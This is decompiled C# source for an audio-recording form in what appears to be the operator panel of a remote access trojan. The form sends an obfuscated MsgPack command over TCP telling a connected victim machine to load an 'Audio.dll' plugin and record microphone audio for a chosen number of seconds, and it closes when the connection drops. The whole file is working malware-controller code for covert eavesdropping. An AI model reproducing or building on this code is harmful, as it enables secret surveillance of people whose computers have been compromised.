using System;
using System.ComponentModel;
using System.Drawing;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;
using Siticone.Desktop.UI.WinForms;

namespace Server.Forms
{
	// Token: 0x02000099 RID: 153
	public partial class FormAudio : Form
	{
		// Token: 0x170000B7 RID: 183
		// (get) Token: 0x0600049D RID: 1181 RVA: 0x000046E5 File Offset: 0x000028E5
		// (set) Token: 0x0600049E RID: 1182 RVA: 0x000046ED File Offset: 0x000028ED
		public FormMain F { get; set; }

		// Token: 0x170000B8 RID: 184
		// (get) Token: 0x0600049F RID: 1183 RVA: 0x000046F6 File Offset: 0x000028F6
		// (set) Token: 0x060004A0 RID: 1184 RVA: 0x000046FE File Offset: 0x000028FE
		internal Clients ParentClient { get; set; }

		// Token: 0x170000B9 RID: 185
		// (get) Token: 0x060004A1 RID: 1185 RVA: 0x00004707 File Offset: 0x00002907
		// (set) Token: 0x060004A2 RID: 1186 RVA: 0x0000470F File Offset: 0x0000290F
		internal Clients Client { get; set; }

		// Token: 0x060004A3 RID: 1187 RVA: 0x00004718 File Offset: 0x00002918
		public FormAudio()
		{
			this.InitializeComponent();
			base.MinimizeBox = false;
			base.MaximizeBox = false;
		}

		// Token: 0x170000BA RID: 186
		// (get) Token: 0x060004A4 RID: 1188 RVA: 0x0000473F File Offset: 0x0000293F
		// (set) Token: 0x060004A5 RID: 1189 RVA: 0x00004747 File Offset: 0x00002947
		public byte[] BytesToPlay { get; set; }

		// Token: 0x060004A6 RID: 1190 RVA: 0x0003429C File Offset: 0x0003249C
		private void btnStartStopRecord_Click(object sender, EventArgs e)
		{
			if (this.textBox1.Text != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "audio";
				msgPack.ForcePathObject("Second").AsString = this.textBox1.Text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Audio.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
				Thread.Sleep(100);
				this.btnStartStopRecord.Text = "Wait...";
				this.btnStartStopRecord.Enabled = false;
				return;
			}
			MessageBox.Show("Input seconds to record.");
		}

		// Token: 0x060004A7 RID: 1191 RVA: 0x00034388 File Offset: 0x00032588
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected || !this.ParentClient.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x040003AF RID: 943
		private SoundPlayer SP = new SoundPlayer();
	}
}
